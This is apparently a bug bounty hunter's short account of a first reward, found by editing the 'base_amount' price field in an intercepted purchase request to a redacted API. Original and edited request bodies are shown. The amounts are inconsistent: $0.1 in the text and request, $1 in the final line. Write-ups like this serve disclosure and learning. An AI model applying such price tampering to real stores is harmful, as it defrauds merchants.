# Introduction

Hello,  
I want to share with you my journey getting my first bounty as a bug bounty hunter. I started exploring the bug bounty world when I saw sir Japz Divino and Tech in the Province videos on YouTube explaining what is bug bounty and how they got started as hunters. Of course, I had some experience in the Cyber World, but it was only a little amount of it. After listening to their advice, I joined their Facebook community and started exploring a list of easy bugs. After learning a few interesting bugs, I began hunting them in the real world.

# HOW I MANAGED TO GET MY FIRST BOUNTY

So, I started joining BugCrowd and HackerOne platforms, but I didn’t have many good findings. I then decided to start dorking some Bug Bounty programs outside of these two platforms. After some exploration, I found one that caught my attention. When I began buying items, I noticed that the item price was visible in the POST request. I tried changing the price from $10 to $0.1, and it was a success!

The request looked like this:
```http
POST /v1/buy HTTP/1.1
Host: api.redacted
{
  "base_amount": "10.00000000",
  "source_client": "web",
  "pay_with_wallet": "true",
  "product_code": "PRODUCT10",
  "recipient_email": "xxxx@mail.com"
}
```

Edited Request:

```http
{
  "base_amount": "0.10000000",
  "source_client": "web",
  "pay_with_wallet": "true",
  "product_code": "PRODUCT10",
  "recipient_email": "xxxx@mail.com"
}

```

I was able to change the `base_amount` from $10 to $1.
